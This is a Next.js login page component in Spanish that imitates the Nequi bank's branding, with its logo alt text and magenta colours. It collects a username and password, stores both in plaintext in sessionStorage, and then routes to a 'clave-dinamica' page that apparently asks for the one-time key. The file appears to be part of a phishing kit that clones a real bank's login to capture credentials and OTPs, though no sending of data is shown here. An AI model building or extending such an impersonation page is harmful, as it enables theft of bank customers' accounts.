'use client'

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { useState } from "react"

export default function LoginPage() {
  const router = useRouter()
  const [formData, setFormData] = useState({
    usuario: '',
    clave: ''
  })

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (formData.usuario && formData.clave) {
      sessionStorage.setItem('usuario', formData.usuario)
      sessionStorage.setItem('clave', formData.clave)
      router.push('/clave-dinamica')
    }
  }

  return (
    <main className="min-h-screen bg-gray-100 p-4">
      <div className="max-w-md mx-auto space-y-4">
        <div className="flex justify-center mb-8">
          <Image
            src="/placeholder.svg?height=48&width=96"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Ingresa a tu cuenta</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="usuario">Usuario</Label>
                <Input
                  id="usuario"
                  required
                  value={formData.usuario}
                  onChange={(e) => setFormData(prev => ({...prev, usuario: e.target.value}))}
                  placeholder="Ingresa tu usuario"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="clave">Clave</Label>
                <Input
                  id="clave"
                  type="password"
                  required
                  value={formData.clave}
                  onChange={(e) => setFormData(prev => ({...prev, clave: e.target.value}))}
                  placeholder="Ingresa tu clave"
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-[#E6007E] hover:bg-[#C4006B]"
                disabled={!formData.usuario || !formData.clave}
              >
                Continuar
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

